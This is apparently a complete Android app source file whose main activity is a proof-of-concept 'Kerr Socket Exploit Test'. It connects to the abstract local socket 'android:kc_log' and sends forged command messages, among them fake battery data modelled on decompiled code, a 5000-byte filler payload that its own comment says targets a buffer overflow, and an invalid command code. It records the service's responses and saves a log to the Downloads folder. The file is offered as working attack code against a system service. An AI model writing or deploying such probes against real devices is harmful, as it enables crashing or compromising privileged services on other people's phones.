package com.example.tzpoc;

import android.Manifest;
import android.content.pm.PackageManager;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestNecessaryPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                stopRequested.set(false);
                isTesting.set(true);
                enableButtons(false, true);
                testThread = new Thread(() -> executeFullTest());
                testThread.start();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void requestNecessaryPermissions() {
        List<String> needed = new ArrayList<>();
        needed.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        needed.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            needed.add(Manifest.permission.READ_MEDIA_IMAGES);
            needed.add(Manifest.permission.READ_MEDIA_VIDEO);
            needed.add(Manifest.permission.READ_MEDIA_AUDIO);
            needed.add(Manifest.permission.POST_NOTIFICATIONS);
        }
        List<String> toRequest = new ArrayList<>();
        for (String perm : needed) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(perm);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    appendLog("Granted: " + permissions[i]);
                } else {
                    appendLog("Denied: " + permissions[i]);
                }
            }
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeFullTest() {
        appendLog("========== Kerr Socket Exploit Test ==========");
        testKerrSocket();
        appendLog("========== ALL TESTS COMPLETED ==========");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
    }

    private void testKerrSocket() {
        String socketName = "android:kc_log";
        appendLog("Connecting to abstract socket: " + socketName);
        LocalSocket socket = null;
        try {
            socket = new LocalSocket();
            socket.connect(new LocalSocketAddress(socketName, LocalSocketAddress.Namespace.ABSTRACT));
            appendLog("Connected successfully!");

            OutputStream os = socket.getOutputStream();
            InputStream is = socket.getInputStream();

            // 1. 空データ送信（a.a(4, null) の模倣）
            appendLog("Sending empty command (type 4)");
            os.write(4);
            os.flush();
            logResponse(is);

            // 2. バッテリー情報を模倣 (a.a(short, byte[]) の形式を真似る)
            //    実際には a.a(short s, byte[] bArr) は timestamp + s を送る
            //    ここでは適当なデータを送る
            appendLog("Sending fake battery data (type 41)");
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            baos.write(41); // command type
            // timestamp 8 bytes (year, month, day, hour, minute, second)
            long now = System.currentTimeMillis();
            baos.write(toByteArray((int)now));
            baos.write(toByteArray((int)(now >> 32)));
            // dummy data
            baos.write("BATTERY_LOW".getBytes(StandardCharsets.US_ASCII));
            os.write(baos.toByteArray());
            os.flush();
            logResponse(is);

            // 3. 長大なペイロードを送信（バッファオーバーフロー狙い）
            appendLog("Sending large payload (5000 bytes)");
            byte[] large = new byte[5000];
            for (int i = 0; i < large.length; i++) large[i] = (byte)0x41;
            os.write(large);
            os.flush();
            logResponse(is);

            // 4. 異常なコマンドコード (0xFF)
            appendLog("Sending invalid command code 0xFF");
            os.write(0xFF);
            os.flush();
            logResponse(is);

            // 5. 抽象ソケットに書き込んだ後、何か読み取れるか
            appendLog("Reading any response (timeout 1000ms)");
            byte[] buf = new byte[1024];
            long start = System.currentTimeMillis();
            while (System.currentTimeMillis() - start < 1000 && is.available() == 0) {
                Thread.sleep(50);
            }
            if (is.available() > 0) {
                int len = is.read(buf);
                if (len > 0) {
                    String resp = new String(buf, 0, len, StandardCharsets.UTF_8);
                    appendLog("Response received: " + resp);
                }
            } else {
                appendLog("No response received.");
            }

            socket.close();
            appendLog("Socket closed.");
        } catch (Exception e) {
            appendLog("Error: " + e.getClass().getSimpleName() + " - " + e.getMessage());
            if (socket != null) try { socket.close(); } catch (Exception ignored) {}
        }
    }

    private void logResponse(InputStream is) {
        try {
            if (is.available() > 0) {
                byte[] buf = new byte[is.available()];
                int len = is.read(buf);
                if (len > 0) {
                    String resp = new String(buf, 0, len, StandardCharsets.UTF_8);
                    appendLog("  Response: " + resp);
                }
            } else {
                appendLog("  No immediate response.");
            }
        } catch (Exception e) {
            appendLog("  Read error: " + e.getMessage());
        }
    }

    private byte[] toByteArray(int value) {
        return new byte[] {
            (byte)(value & 0xFF),
            (byte)((value >> 8) & 0xFF),
            (byte)((value >> 16) & 0xFF),
            (byte)((value >> 24) & 0xFF)
        };
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) {
                ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
            }
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) {
                appendLog("Cannot create Download dir");
                return;
            }
            File file = new File(dir, "kerr_socket_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== Kerr Socket PoC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        saveLog();
    }
}
